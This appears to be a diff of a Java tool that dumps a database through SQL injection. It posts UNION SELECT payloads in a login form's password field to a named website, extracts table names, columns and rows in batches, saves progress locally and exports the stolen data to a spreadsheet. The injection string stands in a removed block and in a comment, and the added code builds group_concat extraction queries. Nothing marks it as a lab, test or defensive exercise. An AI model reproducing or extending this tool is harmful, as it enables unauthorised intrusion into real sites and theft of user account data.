@@ -34,39 +34,45 @@ import com.itextpdf.text.pdf.PdfStructTreeController.returnType;
 public class HttpTest {
     private static HttpClient httpClient = new HttpClient();
     public static void main(String[] args) {
-//        HttpClient httpClient = new HttpClient();
-//
-//        String redirectDomain = "http://zwcwu.gotoip1.com/xiyou/";
-//        String url ="http://zwcwu.gotoip1.com/xiyou/jump.php";
-//
-//        String passWord =
-//                "4944299\" or 2=1 union select 1 as id,group_concat(t.id,\"|\",t.username) AS username,\"\" as password, null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from (select *  from account order by id desc  limit 60,20) as t where \"1\"=\"1";
-//        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
-//        nameValuePairs.add(new NameValuePair("class", "Login"));
-//        nameValuePairs.add(new NameValuePair("type", "login"));
-//        nameValuePairs.add(new NameValuePair("username", "123456"));
-//        nameValuePairs.add(new NameValuePair("password", passWord));
-//        
-//        String result = resolveResult(sendPostHTTP(httpClient, url,redirectDomain,nameValuePairs));
-//        System.out.println(result);
+
 //        resetDatabase();
-        downloadDatabase();
-//        printDatabase();
+//        downloadDatabase();
+//        redownloadDatabase("keyvalue");
+        printDatabase();
         
 
     }
     
+    /**
+     * 手动设置database当前状态
+     * @author A4YL9ZZ pxu3@mmm.com
+     */
     public static void resetDatabase(){
         Database database =null;
         String databaseName = "zwcwu";
         Object obj= readObjectFromFile(databaseName);
         if(obj!=null && obj instanceof Database){
             database = (Database) obj;
-            database.setCurrentTableIndex(0);
+            database.setCurrentTableIndex(12);
+            List<Table> tableList = database.getTableList();
+            for(Table talbe:tableList){
+                if(talbe.getTableName().equals("keyvalue")){
+                    talbe.setCurrentColumn(0);
+                    talbe.setCurrentRow(0);
+                    break;
+                }
+            }
             writeObjectToFile(database,databaseName);
         }
     }
 
+
+    
+    
+    /**
+     * 输出database数据
+     * @author A4YL9ZZ pxu3@mmm.com
+     */
     public static void printDatabase(){
         Database database =null;
         String databaseName = "zwcwu";
@@ -125,7 +131,7 @@ public class HttpTest {
             }
             
             //输出到文件
-            String fileName="database.xlsx";
+            String fileName="./data/database.xlsx";
             try {
                 File file = new File(fileName);
                 if(file.exists()){
@@ -151,6 +157,10 @@ public class HttpTest {
     }
     
 
+    /**
+     * 下载databas数据
+     * @author A4YL9ZZ pxu3@mmm.com
+     */
     public static void downloadDatabase(){
         Database database =null;
         String databaseName="zwcwu";
@@ -165,20 +175,63 @@ public class HttpTest {
         }
 
         writeObjectToFile(database,databaseName);
-        listTables(database);
+        listTables(database,null);
         
         
         
     }
     
-    public static void listTables(Database database){
+    /**
+     * 重新下载指定的Databse的Table数据
+     * @author A4YL9ZZ pxu3@mmm.com
+     * @param tableName
+     */
+    public static void redownloadDatabase(String tableName){
+        Database database =null;
+        String databaseName="zwcwu";
+        Object obj= readObjectFromFile(databaseName);
+        if(obj!=null && obj instanceof Database){
+            database = (Database) obj;
+            System.out.println(database.getDatabaseName());
+        }else{
+            database = new Database(); 
+            
+            database.setDatabaseName(databaseName);
+        }
+
+        writeObjectToFile(database,databaseName);
+        listTables(database,null);
+    }
+    
+    
+
+    public static void downloadDatabaseWithTable(String tableName){
+        Database database =null;
+        String databaseName="zwcwu";
+        Object obj= readObjectFromFile(databaseName);
+        if(obj!=null && obj instanceof Database){
+            database = (Database) obj;
+            System.out.println(database.getDatabaseName());
+        }else{
+            database = new Database(); 
+            
+            database.setDatabaseName(databaseName);
+        }
+
+        writeObjectToFile(database,databaseName);
+        listTables(database,tableName);
+        
+    }
+    
+    
+    public static void listTables(Database database,String tableName){
         //select 1 as id,group_concat(t.id,\"|\",t.username) AS username,\"\" as password, null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from (select *  from account order by id desc  limit 60,20) as t where \"1\"=\"1";
         //先获取数据库中table数量
         if(fillTableCount(database)){
             //再获取表名称
             if(fillTableNameList(database)){
                 //获取具体的每张表的信息
-                fillTableList(database);
+                fillTableList(database,tableName);
             }
         }
 
@@ -247,7 +300,77 @@ public class HttpTest {
      * @param database
      * @return
      */
-    public static boolean fillTableList(Database database){
+    public static boolean fillTableList(Database database,String tableName){
+        int tableCount = database.getTableCount();
+        List<String> tableNameList = database.getTableNameList();
+        List<Table> tableList = database.getTableList();
+        int currentTableIndex = database.getCurrentTableIndex();
+        
+        if(fillTableListSummaryInfo(database)){ 
+            if(tableName!=null){//指定表名模式还是默认顺序处理模式
+                Table table=null;
+                //获取table字段列表
+                for(int i=0 ;i<tableCount;i++){
+                    table = tableList.get(i);
+                    if(table.getTableName().equals(tableName)){
+                        //获取table字段名列表
+                        if(!fillTalbeFieldNames(database,table)){
+                            return false;
+                        }
+                        break;
+                    }
+
+                }
+                
+                writeObjectToFile(database,database.getDatabaseName()); //保存
+                if(!fillTableDatas(database,table)){
+                    return false;
+                }
+                writeObjectToFile(database,database.getDatabaseName()); //保存
+                return true;
+                
+            }else{
+                
+                //获取table字段列表
+                for(int i=0 ;i<tableCount;i++){
+                    Table table = tableList.get(i);
+                    //获取table字段名列表
+                    if(!fillTalbeFieldNames(database,table)){
+                        return false;
+                    }
+                }
+                writeObjectToFile(database,database.getDatabaseName()); //保存
+                
+                //获取具体的数据
+                for(;currentTableIndex<tableCount;currentTableIndex++){
+                    
+                    Table table = tableList.get(currentTableIndex);
+                    if(!fillTableDatas(database,table)){
+                        return false;
+                    }
+                    database.setCurrentTableIndex(currentTableIndex);
+                }
+                writeObjectToFile(database,database.getDatabaseName()); //保存
+                return true;
+                
+            }
+            
+
+        }else{
+            return false;
+        }
+        
+
+
+    }
+
+    /**
+     * 填充table列表中的表的总信息
+     * @author A4YL9ZZ pxu3@mmm.com
+     * @param database
+     * @return
+     */
+    public static boolean fillTableListSummaryInfo(Database database){
         int tableCount = database.getTableCount();
         List<String> tableNameList = database.getTableNameList();
         List<Table> tableList = database.getTableList();
@@ -256,7 +379,7 @@ public class HttpTest {
             tableList = new ArrayList<Table>(tableCount);
             currentTableIndex = 0;
             database.setTableList(tableList);
-            
+            database.setCurrentTableIndex(currentTableIndex);
             for(int i=0 ;i<tableCount;i++){
                 Table table = new Table();
                 table.setTableName(tableNameList.get(i));
@@ -275,33 +398,10 @@ public class HttpTest {
             
             writeObjectToFile(database,database.getDatabaseName()); //保存
         }
-        
-
-        //获取table字段列表
-        for(int i=0 ;i<tableCount;i++){
-            Table table = tableList.get(i);
-            //获取table字段名列表
-            if(!fillTalbeFieldNames(database,table)){
-                return false;
-            }
-            
-            
-        }
-        writeObjectToFile(database,database.getDatabaseName()); //保存
-        
-        //获取具体的数据
-        for(;currentTableIndex<tableCount;currentTableIndex++){
-            
-            Table table = tableList.get(currentTableIndex);
-            if(!fillTableDatas(database,table)){
-                return false;
-            }
-            database.setCurrentTableIndex(currentTableIndex);
-        }
-        writeObjectToFile(database,database.getDatabaseName()); //保存
         return true;
     }
-
+    
+    
     /**
      * 统计表的字段数
      * @author A4YL9ZZ pxu3@mmm.com
@@ -401,8 +501,8 @@ public class HttpTest {
             
             for(;currentRow<rows;currentRow+=step){
                 
-                String sql= formatSql(String.format("group_concat(%s SEPARATOR '||')",fieldName[currentColumn]),
-                        String.format("select * from %s limit %d,%d",tableName,currentRow,rows-currentRow>step?step:rows-currentRow ));
+                String sql= formatSql("group_concat(t.valueStr SEPARATOR \"||\")",
+                        String.format("select %s.%s as valueStr from %s limit %d,%d",tableName,fieldName[currentColumn],tableName,currentRow,rows-currentRow>step?step:rows-currentRow ));
                 String result = processSql(sql);
                 
                 String[] results = result.split("\\|\\|");
@@ -589,6 +689,7 @@ public class HttpTest {
             httpClient.getHostConfiguration().setProxy(proxyHost, Integer.parseInt(proxyPort));
         }
     }
+
     
     
     /**
@@ -598,7 +699,7 @@ public class HttpTest {
      */
     public static void writeObjectToFile(Object obj,String fileName)
     {
-        File file =new File(fileName);
+        File file =new File("./data/"+fileName);
         FileOutputStream out;
         try {
             out = new FileOutputStream(file);
@@ -616,7 +717,7 @@ public class HttpTest {
     public static Object readObjectFromFile(String fileName)
     {
         Object temp=null;
-        File file =new File(fileName);
+        File file =new File("./data/"+fileName);
         FileInputStream in;
         try {
             in = new FileInputStream(file);
